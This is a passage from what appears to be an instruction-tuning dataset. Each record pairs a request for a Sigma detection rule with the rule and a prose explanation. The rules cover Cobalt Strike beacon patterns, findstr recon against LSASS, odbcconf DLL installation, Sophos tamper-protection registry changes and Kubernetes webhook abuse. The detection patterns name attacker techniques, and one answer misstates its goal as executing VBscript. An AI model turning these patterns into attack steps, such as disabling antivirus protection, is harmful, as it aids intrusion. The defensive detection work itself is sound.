'\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe'\n    filter_optional_null:\n        Image: null\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are expected since this rules is only looking for the DLL load event. This rule is better used in correlation with related activity\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded: 'C:\\Windows\\System32\\MicrosoftAccountTokenProvider.dll'\n    filter_main_bgtaskhost:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n        Image|endswith: '\\BackgroundTaskHost.exe'\n        #CommandLine|contains: '-ServerNameBackgroundTaskHost.WebAccountProvider'\n    filter_optional_devenv:\n        Image|startswith:\n            - 'C:\\Program Files\\Microsoft Visual Studio\\'\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\'\n        Image|endswith: '\\IDE\\devenv.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_onedrive:\n        Image|endswith: '\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe'\n    filter_optional_null:\n        Image: null\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are expected since this rules is only looking for the DLL load event. This rule is better used in correlation with related activity\nlevel: low\n",
      "question": "abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser.\nAn attacker can use this to authenticate to Azure AD in a browser as that user.\n",
      "answer": "In order to detect abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser. An attacker can use this to authenticate to Azure AD in a browser as that user, you should: monitor for the loading of the MicrosoftAccountTokenProvider.dll from the C:\\Windows\\System32 directory on Windows systems. This detection is based on the premise that during an attack attempting to exploit Azure Browser SSO for unauthorized authentication via OAuth 2.0 refresh tokens, the MicrosoftAccountTokenProvider.dll would be crucial since it is linked to handling of Microsoft account tokens.\n\nTo refine the detection and minimize false positives, it's advisable to exclude events where the loaded images are part of legitimate background tasks, including tasks started by BackgroundTaskHost.exe located either in the System32 or SysWOW64 directories. Similarly, activities initiated by recognized developer tools like Microsoft Visual Studio, browsers such as Internet Explorer or Microsoft Edge, as well as OneDrive, should also be considered as exceptions unless other suspicious activities correlate.\n\nThis monitoring strategy leverages the understanding that simply loading the said DLL can occur in non-malicious scenarios. Therefore, alerting on this event alone is classified with a low-level severity. It is most effective when this activity is correlated with other suspicious actions that could indicate an attack aimed at misusing Azure Browser SSO features to gain unauthorized access. The tags associated with this attack would relate to techniques that abuse legitimate authentication processes to perform unauthorized actions, reflecting an exploitation of trusted processes for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs, you should: Monitor Windows process creation logs for instances where the 'odbcconf.exe' file is involved in process initiation, specifically focusing on situations where the command line includes both 'INSTALLDRIVER ' (note the space after 'INSTALLDRIVER') and a '.dll' file reference. This combination of command line parameters is indicative of attempts to install new ODBC drivers, which can be abused by attackers to execute malicious DLLs. However, it's important to consider that legitimate driver DLLs being registered in this manner might generate false positives. Such events necessitate further investigation into the DLL's path and content to confirm whether the activity is authorized or malicious. This process aims to provide a medium-level security monitoring capability by tagging behaviors associated with the use of system administration tools in potentially harmful ways.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium\n",
      "question": "execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.",
      "answer": "In order to detect execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs, you should: Monitor Windows process creation logs for instances where the 'odbcconf.exe' file is involved in process initiation, specifically focusing on situations where the command line includes both 'INSTALLDRIVER ' (note the space after 'INSTALLDRIVER') and a '.dll' file reference. This combination of command line parameters is indicative of attempts to install new ODBC drivers, which can be abused by attackers to execute malicious DLLs. However, it's important to consider that legitimate driver DLLs being registered in this manner might generate false positives. Such events necessitate further investigation into the DLL's path and content to confirm whether the activity is authorized or malicious. This process aims to provide a medium-level security monitoring capability by tagging behaviors associated with the use of system administration tools in potentially harmful ways."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential process patterns related to Cobalt Strike beacon activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential process patterns related to Cobalt Strike beacon activity, you should monitor Windows process creation logs for specific patterns in command line execution and parent process behavior. Look for processes initiated with the command line ending with 'cmd.exe /C whoami' that originate from a parent image starting with 'C:\\Temp\\'. Also, watch for parent images named 'runonce.exe' or 'dllhost.exe' that execute command lines containing both 'cmd.exe /c echo' and output redirection to a named pipe ('> \\\\\\\\.\\\\pipe'). Furthermore, identify instances where the parent command line contains 'cmd.exe /C echo' along with redirection to a named pipe, and the command line ends with 'conhost.exe 0xffffffff -ForceV1'. Additionally, flag events where the parent command line ends with '/C whoami' and the child process command line ends with 'conhost.exe 0xffffffff -ForceV1'. These specific patterns of process creation and command line execution are indicative of activities commonly associated with the Cobalt Strike beacon, a threat actor toolset used for establishing persistence and command and control in compromised systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_generic_1:\n        CommandLine|endswith: 'cmd.exe /C whoami'\n        ParentImage|startswith: 'C:\\Temp\\'\n    selection_generic_2:\n        ParentImage|endswith:\n            - '\\runonce.exe'\n            - '\\dllhost.exe'\n        CommandLine|contains|all:\n            - 'cmd.exe /c echo'\n            - '> \\\\\\\\.\\\\pipe'\n    selection_conhost_1:\n        ParentCommandLine|contains|all:\n            - 'cmd.exe /C echo'\n            - ' > \\\\\\\\.\\\\pipe'\n        CommandLine|endswith: 'conhost.exe 0xffffffff -ForceV1'\n    selection_conhost_2:\n        ParentCommandLine|endswith: '/C whoami'\n        CommandLine|endswith: 'conhost.exe 0xffffffff -ForceV1'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_generic_1:\n        CommandLine|endswith: 'cmd.exe /C whoami'\n        ParentImage|startswith: 'C:\\Temp\\'\n    selection_generic_2:\n        ParentImage|endswith:\n            - '\\runonce.exe'\n            - '\\dllhost.exe'\n        CommandLine|contains|all:\n            - 'cmd.exe /c echo'\n            - '> \\\\\\\\.\\\\pipe'\n    selection_conhost_1:\n        ParentCommandLine|contains|all:\n            - 'cmd.exe /C echo'\n            - ' > \\\\\\\\.\\\\pipe'\n        CommandLine|endswith: 'conhost.exe 0xffffffff -ForceV1'\n    selection_conhost_2:\n        ParentCommandLine|endswith: '/C whoami'\n        CommandLine|endswith: 'conhost.exe 0xffffffff -ForceV1'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential process patterns related to Cobalt Strike beacon activity",
      "answer": "In order to detect potential process patterns related to Cobalt Strike beacon activity, you should monitor Windows process creation logs for specific patterns in command line execution and parent process behavior. Look for processes initiated with the command line ending with 'cmd.exe /C whoami' that originate from a parent image starting with 'C:\\Temp\\'. Also, watch for parent images named 'runonce.exe' or 'dllhost.exe' that execute command lines containing both 'cmd.exe /c echo' and output redirection to a named pipe ('> \\\\\\\\.\\\\pipe'). Furthermore, identify instances where the parent command line contains 'cmd.exe /C echo' along with redirection to a named pipe, and the command line ends with 'conhost.exe 0xffffffff -ForceV1'. Additionally, flag events where the parent command line ends with '/C whoami' and the child process command line ends with 'conhost.exe 0xffffffff -ForceV1'. These specific patterns of process creation and command line execution are indicative of activities commonly associated with the Cobalt Strike beacon, a threat actor toolset used for establishing persistence and command and control in compromised systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Execute VBscript code that is referenced within the *.bgi file..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to execute VBscript code that is referenced within the *.bgi file, you should monitor the creation of processes on Windows systems, especially focusing on the execution of 'bginfo.exe'. Specifically, look for instances where 'bginfo.exe' is executed with command line parameters that include both '/popup' and '/nolicprompt'. These command line parameters are crucial indicators of the script\u2019s execution attempt without displaying license prompts, potentially for stealthy operations. It's important to note that detecting such activities can be challenging and might result in unknown false positives. The severity of this activity is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\bginfo.exe'\n        CommandLine|contains|all:\n            - '/popup'\n            - '/nolicprompt'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\bginfo.exe'\n        CommandLine|contains|all:\n            - '/popup'\n            - '/nolicprompt'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Execute VBscript code that is referenced within the *.bgi file.",
      "answer": "In order to execute VBscript code that is referenced within the *.bgi file, you should monitor the creation of processes on Windows systems, especially focusing on the execution of 'bginfo.exe'. Specifically, look for instances where 'bginfo.exe' is executed with command line parameters that include both '/popup' and '/nolicprompt'. These command line parameters are crucial indicators of the script\u2019s execution attempt without displaying license prompts, potentially for stealthy operations. It's important to note that detecting such activities can be challenging and might result in unknown false positives. The severity of this activity is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting findstring commands that include the keyword lsass, which indicates recon actviity for the LSASS process PID.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect findstring commands that include the keyword lsass, which indicates recon activity for the LSASS process PID, you should: monitor process creation events on Windows systems specifically for the execution of 'findstr.exe.' Ensure to check for instances where the 'Image' field ends with '\\findstr.exe' or the 'OriginalFileName' is 'FINDSTR.EXE.' Additionally, examine any command line input for the presence of 'lsass' to capture attempts at querying or manipulating the Local Security Authority Subsystem Service (LSASS) process. Special attention should be given to command lines that include variations such as ' /i lsass.exe', ' /i \"lsass', along with direct 'findstr' commands targeting 'lsass' either as 'findstr lsass', 'findstr.exe lsass', 'findstr \"lsass', or 'findstr.exe \"lsass'. The detection of any such activities should trigger a high-level alert due to the reconnaissance nature targeting the LSASS process, a critical component in Windows authentication mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr_img:\n        - Image|endswith: '\\findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_findstr_cli:\n        CommandLine|contains: 'lsass'\n    selection_special:\n        CommandLine|contains:\n            - ' /i lsass.exe'\n            - ' /i \"lsass'\n            - 'findstr lsass'\n            - 'findstr.exe lsass'\n            - 'findstr \"lsass'\n            - 'findstr.exe \"lsass'\n    condition: all of selection_findstr_* or selection_special\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr_img:\n        - Image|endswith: '\\findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_findstr_cli:\n        CommandLine|contains: 'lsass'\n    selection_special:\n        CommandLine|contains:\n            - ' /i lsass.exe'\n            - ' /i \"lsass'\n            - 'findstr lsass'\n            - 'findstr.exe lsass'\n            - 'findstr \"lsass'\n            - 'findstr.exe \"lsass'\n    condition: all of selection_findstr_* or selection_special\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "findstring commands that include the keyword lsass, which indicates recon actviity for the LSASS process PID",
      "answer": "In order to detect findstring commands that include the keyword lsass, which indicates recon activity for the LSASS process PID, you should: monitor process creation events on Windows systems specifically for the execution of 'findstr.exe.' Ensure to check for instances where the 'Image' field ends with '\\findstr.exe' or the 'OriginalFileName' is 'FINDSTR.EXE.' Additionally, examine any command line input for the presence of 'lsass' to capture attempts at querying or manipulating the Local Security Authority Subsystem Service (LSASS) process. Special attention should be given to command lines that include variations such as ' /i lsass.exe', ' /i \"lsass', along with direct 'findstr' commands targeting 'lsass' either as 'findstr lsass', 'findstr.exe lsass', 'findstr \"lsass', or 'findstr.exe \"lsass'. The detection of any such activities should trigger a high-level alert due to the reconnaissance nature targeting the LSASS process, a critical component in Windows authentication mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting tamper attempts to sophos av functionality via registry key modification.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect tamper attempts to Sophos AV functionality via registry key modification, you should: Focus on monitoring registry set actions within Windows environments. Specifically, look out for the event type `SetValue`, indicating a modification attempt on registry keys. Key targets for this detection are registry paths related to Sophos Endpoint Defense and SAVService tamper protection configurations, which include:\n\n- `\\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled`\n- `\\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled`\n- `\\Sophos\\SAVService\\TamperProtection\\Enabled`\n\nA critical signal of a tampering attempt is the modification of these registry keys' values to `DWORD (0x00000000)`, effectively disabling the Sophos Endpoint Defense tamper protection features. \n\nKeep in mind that there might be false positives, such as when the antivirus itself legitimately disables this feature. Thus, any modifications to these registry keys should be investigated to confirm whether they are legitimate changes or potential security threats. The severity level of this detection is high, underscoring the importance of such monitoring in maintaining the integrity of Sophos antivirus functionalities against tampering efforts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled'\n            - '\\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled'\n            - '\\Sophos\\SAVService\\TamperProtection\\Enabled'\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Some FP may occur when the feature is disabled by the AV itself, you should always investigate if the action was legitimate\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled'\n            - '\\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled'\n            - '\\Sophos\\SAVService\\TamperProtection\\Enabled'\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Some FP may occur when the feature is disabled by the AV itself, you should always investigate if the action was legitimate\nlevel: high\n",
      "question": "tamper attempts to sophos av functionality via registry key modification",
      "answer": "In order to detect tamper attempts to Sophos AV functionality via registry key modification, you should: Focus on monitoring registry set actions within Windows environments. Specifically, look out for the event type `SetValue`, indicating a modification attempt on registry keys. Key targets for this detection are registry paths related to Sophos Endpoint Defense and SAVService tamper protection configurations, which include:\n\n- `\\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled`\n- `\\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled`\n- `\\Sophos\\SAVService\\TamperProtection\\Enabled`\n\nA critical signal of a tampering attempt is the modification of these registry keys' values to `DWORD (0x00000000)`, effectively disabling the Sophos Endpoint Defense tamper protection features. \n\nKeep in mind that there might be false positives, such as when the antivirus itself legitimately disables this feature. Thus, any modifications to these registry keys should be investigated to confirm whether they are legitimate changes or potential security threats. The severity level of this detection is high, underscoring the importance of such monitoring in maintaining the integrity of Sophos antivirus functionalities against tampering efforts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies when an admission controller is executed in GCP Kubernetes.\nA Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server.\nThe behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster.\nAn adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster.\nFor example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials.\nAn adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when an admission controller is executed in GCP Kubernetes, you should: Monitor GCP audit logs for specific method names that start with 'admissionregistration.k8s.io.v', contain either '.mutatingwebhookconfigurations.' or '.validatingwebhookconfigurations.', and end with 'create', 'patch', or 'replace'. These method names are associated with Kubernetes Admission Controllers, which play a crucial role in the Kubernetes API request processing pipeline. Admission controllers can intercept, modify, or deny requests to the Kubernetes API, thus controlling the behavior of the cluster. By monitoring for the creation, modification, or replacement of mutating or validating webhook configurations, it's possible to detect potential malicious activity aimed at gaining persistence within the cluster or intercepting sensitive information. This detection focuses on operations within the Google Cloud Platform's Kubernetes service, specifically actions that could indicate an adversary's attempt to deploy a mutating admission webhook for malicious pod alteration or a validating admission webhook to capture access credentials and other sensitive data. Note that legitimate administrative activity may also trigger these detections, so it's important to validate and exempt known good behavior to reduce false positives. The level of concern for such detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: gcp\n    service: gcp.audit\ndetection:\n    selection:\n        gcp.audit.method_name|startswith: 'admissionregistration.k8s.io.v'\n        gcp.audit.method_name|contains:\n            - '.mutatingwebhookconfigurations.'\n            - '.validatingwebhookconfigurations.'\n        gcp.audit.method_name|endswith:\n            - 'create'\n            - 'patch'\n            - 'replace'\n    condition: selection\nfalsepositives:\n    - Google Cloud Kubernetes Admission Controller may be done by a system administrator.\n    - If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: gcp\n    service: gcp.audit\ndetection:\n    selection:\n        gcp.audit.method_name|startswith: 'admissionregistration.k8s.io.v'\n        gcp.audit.method_name|contains:\n            - '.mutatingwebhookconfigurations.'\n            - '.validatingwebhookconfigurations.'\n        gcp.audit.method_name|endswith:\n            - 'create'\n            - 'patch'\n            - 'replace'\n    condition: selection\nfalsepositives:\n    - Google Cloud Kubernetes Admission Controller may be done by a system administrator.\n    - If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "Identifies when an admission controller is executed in GCP Kubernetes.\nA Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server.\nThe behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster.\nAn adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster.\nFor example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials.\nAn adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information.\n",
      "answer": "In order to identify when an admission controller is executed in GCP Kubernetes, you should: Monitor GCP audit logs for specific method names that start with 'admissionregistration.k8s.io.v', contain either '.mutatingwebhookconfigurations.' or '.validatingwebhookconfigurations.', and end with 'create', 'patch', or 'replace'. These method names are associated with Kubernetes Admission Controllers, which play a crucial role in the Kubernetes API request processing pipeline. Admission controllers can intercept, modify, or deny requests to the Kubernetes API, thus controlling the behavior of the cluster. By monitoring for the creation, modification, or replacement of mutating or validating webhook configurations, it's possible to detect potential malicious activity aimed at gaining persistence within the cluster or intercepting sensitive information. This detection focuses on operations within the Google Cloud Platform's Kubernetes service, specifically actions that could indicate an adversary's attempt to deploy a mutating admission webhook for malicious pod alteration or a validating admission webhook to capture access credentials and other sensitive data. Note that legitimate administrative activity may also trigger these detections, so it's important to validate and exempt known good behavior to reduce false positives. The level of concern for such detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate.\nKubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs.\nAn Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster, you should: Monitor Azure activity logs for specific operation names that indicate interaction with Kubernetes connected clusters and managed clusters, particularly those operation names that start with 'MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH' or 'MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH' and end with '/CRONJOBS/WRITE' or '/JOBS/WRITE'. These logs are indicative of activities related to the creation or modification of Kubernetes Jobs and CronJobs, which can be used for legitimate batch processing tasks but might also be utilized by adversaries for malicious purposes. It is essential to consider that some detected activities may be legitimate administrative actions. Hence, known benign behaviors may need to be filtered out to reduce false positives. This approach leverages Azure's logging capabilities to identify potential misuse of Kubernetes CronJobs and Jobs, ensuring that only those activities that deviate from expected patterns are flagged for further investigation. The associated tactics and techniques for this kind of monitoring include Execution and Persistence, as managing and scheduling tasks like CronJobs and Jobs can be abused by attackers to execute malicious code or maintain their presence within a cluster.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName|startswith: \n            - 'MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH'\n            - 'MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH'\n        operationName|endswith:\n            - '/CRONJOBS/WRITE'\n            - '/JOBS/WRITE'\n    condition: selection\nfalsepositives:\n    - Azure Kubernetes CronJob/Job may be done by a system administrator.\n    - If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName|startswith: \n            - 'MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH'\n            - 'MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH'\n        operationName|endswith:\n            - '/CRONJOBS/WRITE'\n            - '/JOBS/WRITE'\n    condition: selection\nfalsepositives:\n    - Azure Kubernetes CronJob/Job may be done by a system administrator.\n    - If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate.\nKubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs.\nAn Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n",
      "answer": "In order to identify when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster, you should: Monitor Azure activity logs for specific operation names that indicate interaction with Kubernetes connected clusters and managed clusters, particularly those operation names that start with 'MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH' or 'MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH' and end with '/CRONJOBS/WRITE' or '/JOBS/WRITE'. These logs are indicative of activities related to the creation or modification of Kubernetes Jobs and CronJobs, which can be used for legitimate batch processing tasks but might also be utilized by adversaries for malicious purposes. It is essential to consider that some detected activities may be legitimate administrative actions. Hence, known benign behaviors may need to be filtered out to reduce false positives. This approach leverages Azure's logging capabilities to identify potential misuse of Kubernetes CronJobs and Jobs, ensuring that only those activities that deviate from expected patterns are flagged for further investigation. The associated tactics and techniques for this kind of monitoring include Execution and Persistence, as managing and scheduling tasks like CronJobs and Jobs can be abused by attackers to execute malicious code or maintain their presence within a cluster."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PowerShell core DLL being loaded by an Office Product.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PowerShell core DLL being loaded by an Office Product, you should monitor for the loading of specific images in Windows. This entails tracking when any of the main Office applications, such as Excel, Microsoft Publisher, Outlook, OneNote (including a specific variant labeled 'onenoteim' for completeness), PowerPoint, and Word, loads images. The detection hinges on identifying when these applications load either 'System.Management.Automation.Dll' or 'System.Management.Automation.ni.Dll,' which are core components of PowerShell. This activity is noteworthy as it could suggest an attempt to execute PowerShell commands or scripts in a manner that leverages Office products, possibly for malicious purposes. The monitoring for such behavior is set at a medium level of concern due to the potential for false positives, which are currently unspecified but could arise from legitimate uses of PowerShell functionalities within these Office applications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\excel.exe'\n            - '\\mspub.exe'\n            - '\\outlook.exe'\n            - '\\onenote.exe'\n            - '\\onenoteim.exe' # Just in case\n            - '\\powerpnt.exe'\n            - '\\winword.exe'\n        ImageLoaded|contains:\n            - '\\System.Management.Automation.Dll'\n            - '\\System.Management.Automation.ni.Dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\excel.exe'\n            - '\\mspub.exe'\n            - '\\outlook.exe'\n            - '\\onenote.exe'\n            - '\\onenoteim.exe' # Just in case\n            - '\\powerpnt.exe'\n            - '\\winword.exe'\n        ImageLoaded|contains:\n            - '\\System.Management.Automation.Dll'\n            - '\\System.Management.Automation.ni.Dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "PowerShell core DLL being loaded by an Office Product",
      "answer": "In order to detect PowerShell core DLL being loaded by an Office Product, you should monitor for the loading of specific images in Windows. This entails tracking when any of the main Office applications, such as Excel, Microsoft Publisher, Outlook, OneNote (including a specific variant labeled 'onenoteim' for completeness), PowerPoint, and Word, loads images. The detection hinges on identifying when these applications load either 'System.Management.Automation.Dll' or 'System.Management.Automation.ni.Dll,' which are core components of PowerShell. This activity is noteworthy as it could suggest an attempt to execute PowerShell commands or scripts in a manner that leverages Office products, possibly for malicious purposes. The monitoring for such behavior is set at a medium level of concern due to the potential for false positives, which are currently unspecified but could arise from legitimate uses of PowerShell functionalities within these Office applications."
    }
  },
  {
